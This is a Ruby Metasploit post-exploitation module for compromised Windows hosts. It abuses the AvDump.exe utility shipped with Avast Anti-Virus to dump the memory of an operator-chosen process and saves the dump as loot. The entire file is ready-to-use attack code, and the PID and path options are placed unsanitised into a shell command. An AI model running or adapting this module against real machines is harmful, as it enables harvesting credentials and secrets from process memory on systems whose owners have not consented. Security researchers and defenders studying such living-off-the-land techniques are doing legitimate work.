require 'rbconfig'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Avast AV Memory Dumping Utility',
        'Description'   => %q{
            This module leverages an Avast Anti-Virus memory dump utility that is shipped
            by default with Avast Anti-Virus Home software suite.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'DLL_Cool_J' ],
        'Platform'      => [ 'win'],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))

    register_options ( [
        OptString.new('PID', [true, 'specify pid to dump' ]),
        OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', "C:\\Users\\Public\\tmp.dmp"])
    ])
  end

  def check_for_dump
    if file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe")
        print_status("AvDump.exe exists!")
        return true
    else
        print_error("AvDump.exe does not exist on target.")
        return false
    end

  end

  def run
    if check_for_dump
        print_status("executing Avast mem dump utility against #{datastore['PID']} to #{datastore['DUMP_PATH']}")
        result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{datastore['PID']} --exception_ptr 0 --thread_id 0 --dump_file #{datastore['DUMP_PATH']} --min_interval 0")
        mem_file = read_file("#{datastore['DUMP_PATH']}")
        store_loot("host.avast.memdump", "binary/db", session, mem_file)
        print_status(result)
    end
  end
end
